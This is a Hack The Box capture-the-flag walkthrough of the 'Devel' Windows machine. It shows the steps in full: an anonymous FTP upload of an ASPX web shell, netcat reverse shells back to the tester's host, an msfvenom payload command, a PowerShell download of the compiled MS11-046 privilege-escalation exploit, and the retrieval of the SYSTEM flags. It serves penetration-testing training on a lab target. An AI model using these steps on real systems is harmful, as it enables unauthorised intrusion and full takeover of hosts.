# Hack The Box - Devel Walkthrough without Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.5 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-29 07:54 EST
Nmap scan report for 10.10.10.5
Host is up (0.48s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.73 seconds
```

We get back the following result showing that 5 ports are open:
- Port `21`: running `Microsoft ftpd`.
- Port `80`: running `Microsoft IIS httpd 7.5`.

Before starting enumeration, I ran a more comprehensive scan in the background to make sure that I did not miss anything.

So I ran `Rustscan` that covers all ports.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
└─$ rustscan -a 10.10.10.5 --range 1-65535 
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.5:21
Open 10.10.10.5:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 21,80 10.10.10.5

Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-29 07:57 EST
Initiating Ping Scan at 07:57
Scanning 10.10.10.5 [2 ports]
Completed Ping Scan at 07:57, 0.28s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 07:57
Completed Parallel DNS resolution of 1 host. at 07:57, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 07:57
Scanning 10.10.10.5 [2 ports]
Discovered open port 21/tcp on 10.10.10.5
Discovered open port 80/tcp on 10.10.10.5
Completed Connect Scan at 07:57, 0.80s elapsed (2 total ports)
Nmap scan report for 10.10.10.5
Host is up, received syn-ack (0.37s latency).
Scanned at 2023-01-29 07:57:56 EST for 1s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds                                                              
```

Now, that I know that there were only 2 ports open, I decided to carry on with the enumeration.

## Enumeration
Since port `21` allowed anyone to log into the FTP server with the username `anonymous` and password `anonymous` to access the files on the server.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
└─$ ftp 10.10.10.5      
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:darshan): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> bin
200 Type set to I.
ftp> ls
229 Entering Extended Passive Mode (|||49163|)
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
ftp> mget welcome.png
mget welcome.png [anpqy?]? y
229 Entering Extended Passive Mode (|||49166|)
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************|   180 KiB   37.20 KiB/s    00:00 ETA
226 Transfer complete.
184946 bytes received in 00:05 (35.62 KiB/s)
ftp> bye
221 Goodbye.          
```

I logged into the ftp server and could see a few files, so I decided to download and view these files.

Now, `welcome.png` was a basic file, so I decided to use `exiftool` to look at the metadata of the file and couldn't find anything.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
└─$ exiftool welcome.png     
ExifTool Version Number         : 12.44
File Name                       : welcome.png
Directory                       : .
File Size                       : 185 kB
File Modification Date/Time     : 2017:03:17 10:37:30-04:00
File Access Date/Time           : 2023:01:29 07:58:09-05:00
File Inode Change Date/Time     : 2023:01:29 07:58:09-05:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 571
Image Height                    : 411
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Image Size                      : 571x411
Megapixels                      : 0.235
```

Now, I decided to visit the web-page and the first I did was to try and navigate to the files I saw in the `ftp` server. I was able to access them

![dvl-1](https://user-images.githubusercontent.com/87711310/215329193-04e2a8fd-8e04-4326-a5fc-6ef82df709dd.png)

![dvl-2](https://user-images.githubusercontent.com/87711310/215329197-5ef4eec2-8186-46bd-82cf-a35026fdfdbf.png)

The FTP server seems to be in the same root as the HTTP server. I had a thought that if I upload a `reverse shell` in the `FTP` server, I might be able to run it through the web server.

And to test this, I created a basic `test.html` file that just displays `hello world`

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
└─$ echo "<html><body>hello world</body></html>" > test.html
                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
└─$ cat test.html
<html><body>hello world</body></html>
```

Now, I transferred the file into the `ftp` server.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
└─$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:darshan): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49169|)
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
ftp> put test.html
local: test.html remote: test.html
229 Entering Extended Passive Mode (|||49170|)
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************|    33      596.78 KiB/s    --:-- ETA
226 Transfer complete.
33 bytes sent in 00:00 (0.04 KiB/s)
ftp> bye
```

Now that the file was present in the `ftp` server, I navigated to the web-page and visited the `/test.html` to see whether it worked or it didnt.

![dvl-3](https://user-images.githubusercontent.com/87711310/215329893-69358d65-8453-41fb-89d7-772c7b127dec.png)

Now that it's confirmed that if we upload a file in the ftp server, and call it in the browser it will get executed by the web server.

So. now I just had to find out what service was running, and since he web server is Microsoft IIS version 7.5, it generally either executes `ASP` or `ASPX (ASP.NET)`.

But, I turned on my `Burp`, intercepted the request and confirmed it

```burp
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Fri, 17 Mar 2017 14:37:30 GMT
Accept-Ranges: bytes
ETag: "37b5ed12c9fd21:0"
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Sun, 29 Jan 2023 13:33:15 GMT
Connection: close
Content-Length: 689
```

Seeing that this server is running ASP.NET means I will likely need a .aspx webshell when I get to that.

So, with a simple google search for `aspx` webshell, I found the one that comes with SecLists. I found it and copied it to my local directory.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
└─$ locate cmd.aspx
/usr/share/davtest/backdoors/aspx_cmd.aspx
/usr/share/wordlists/SecLists-master/Web-Shells/FuzzDB/cmd.aspx
                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
└─$ cp /usr/share/wordlists/SecLists-master/Web-Shells/FuzzDB/cmd.aspx .

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
└─$ ls             
cmd.aspx  gobuster.txt  nmap  test.html  welcome.png
```

Now, I transferred the `cmd.aspx` file to the `ftp` server using the `put` command

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
└─$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:darshan): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put cmd.aspx
local: cmd.aspx remote: cmd.aspx
229 Entering Extended Passive Mode (|||49167|)
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************|  1442       19.64 MiB/s    --:-- ETA
226 Transfer complete.
1442 bytes sent in 00:00 (2.95 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||49168|)
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
01-29-23  03:01PM                 1442 cmd.aspx
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
```

Now I visited http://10.10.10.5/cmd.aspx and I get a form that I could use to run commands on the web-page:

![dvl-4](https://user-images.githubusercontent.com/87711310/215329895-a495d0b4-216a-416d-a0e5-479ffa0217b0.png)

On a Windows host, I use `smbserver.py` to transfer files back and forth. So, I'll make a directory named `smb`, copy `netcat (nc.exe)` into it.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
└─$ mkdir smb  
                                                                                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
└─$ locate nc.exe
/usr/share/windows-resources/binaries/nc.exe
/usr/share/wordlists/SecLists-master/Web-Shells/FuzzDB/nc.exe
                                                                                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
└─$ cp /usr/share/wordlists/SecLists-master/Web-Shells/FuzzDB/nc.exe smb
```

Now, I used `smb server` and pass this to the website, and turn on `netcat` listener to get back a shell

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
└─$ smbserver.py share smb
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Starting `netcat` listener.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-Boxes/Devel]
└─$ nc 10.10.10.5 4444
```

And I entered the following commands into the webshell.
```
\\10.10.16.2\share\nc.exe -e cmd.exe 10.10.16.2 443
```

And I get a shell on my listener:
```
c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web

c:\windows\system32\inetsrv>
```

## Alternate way to get a shell
You can also use `msfvenom` to generate the `aspx` payload using the following command:

```
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=Your IP LPORT=4444 -o reverse-shell.aspx
```

Once done, you can visit `/reverse-shell.aspx`, turn on netcat listener and get back a reverse shell

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
└─$ nc -lvnp 4444    
listening on [any] 4444 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.5] 49175
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web

c:\windows\system32\inetsrv>
```

I, then, changed to the `Users` directory to retrieve the flag

```
c:\windows\system32\inetsrv>cd c:\users
cd c:\users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of c:\Users

18/03/2017  01:16 ��    <DIR>          .
18/03/2017  01:16 ��    <DIR>          ..
18/03/2017  01:16 ��    <DIR>          Administrator
17/03/2017  04:17 ��    <DIR>          babis
18/03/2017  01:06 ��    <DIR>          Classic .NET AppPool
14/07/2009  09:20 ��    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)   4.697.743.360 bytes free

c:\Users>cd babis
cd babis
Access is denied.

c:\Users>cd Administrator
cd Administrator
Access is denied.
```

There was a user `babis` and `Administrator` directory and I was denied access to both of them.

## Privilege Escalation
So, then, the first thing I looked at was `systeminfo` to find out the `OS Name`, `System Type`, and other stuff

![dvl-5](https://user-images.githubusercontent.com/87711310/215333489-6e133fb6-cc27-4d16-bf7e-6f1e0f78b730.png)

Since, I was running `Windows 7 Enterprise`, I was pretty sure that it was vulnerable to bunch of exploits.

So, I instantly use google to look for exploits.

![dvl-6](https://user-images.githubusercontent.com/87711310/215333583-ab21e6ed-9c37-4764-ae99-1c4ec43d2237.png)

I found the [Local Privilege Escalation](https://www.exploit-db.com/exploits/40564), which was well documented.

So I just hoped into my machine and searched for the same exploit using `searchsploit` with the help of the `EDB-ID` given on the exploit-db web-page

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
└─$ searchsploit -m 40564
  Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)
      URL: https://www.exploit-db.com/exploits/40564
     Path: /usr/share/exploitdb/exploits/windows_x86/local/40564.c
File Type: C source, ASCII text

Copied to: /home/kali/Desktop/HackTheBox/Windows-boxes/Devel/40564.c
```

The exploit was written in `C` so it required to be compiled first and the detailed instructions were given in the exploit-db page.

The compilation process required `mingw-w64` to be installed, so if you don't have `mingw-w64` you can install it using following commands:
```
apt-get update
apt-get install mingw-w64
```

Then, compile it using the listed command: 
```
i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
```

Now that the file is compiled, I had to transfer it to the machine 

I started up a server on my machine 
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
└─$ python -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
```


Running the following `powershell` script to download the file from the server running on my local machine
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.2:9999/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"
```

```
c:\Users>powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.2:9999/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.2:9999/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"

c:\Users>dir c:\Users\Public\Downloads\
dir c:\Users\Public\Downloads\
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of c:\Users\Public\Downloads

29/01/2023  04:50 ��    <DIR>          .
29/01/2023  04:50 ��    <DIR>          ..
29/01/2023  04:51 ��           250.295 40564.exe
               1 File(s)        250.295 bytes
               2 Dir(s)   4.697.464.832 bytes free
```

Now that the file was downloaded, all I needed to do is to execute the file.

```
c:\Users\Public\Downloads>40564.exe
40564.exe

c:\Windows\System32>whoami
whoami
nt authority\system

c:\Windows\System32>
```

Now that I was `nt authority\system` which is equivalent to `root` in debian based system, I could retrieve both, `user's` and the `root's` flag.

```
c:\Windows\System32>cd c:\users
cd c:\users

c:\Users>cd babis
cd babis

c:\Users\babis>cd Desktop
cd Desktop

c:\Users\babis\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of c:\Users\babis\Desktop

11/02/2022  03:54 ��    <DIR>          .
11/02/2022  03:54 ��    <DIR>          ..
29/01/2023  02:52 ��                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   4.697.452.544 bytes free

c:\Users\babis\Desktop>type user.txt
type user.txt
[REDACTED]

c:\Users\babis\Desktop>cd ..
cd ..

c:\Users\babis>cd ..
cd ..

c:\Users>cd Administrator
cd Administrator

c:\Users\Administrator>cd Desktop
cd Desktop

c:\Users\Administrator\Desktop>dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of c:\Users\Administrator\Desktop

14/01/2021  11:42 ��    <DIR>          .
14/01/2021  11:42 ��    <DIR>          ..
29/01/2023  02:52 ��                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   4.697.452.544 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
[REDACTED]

```
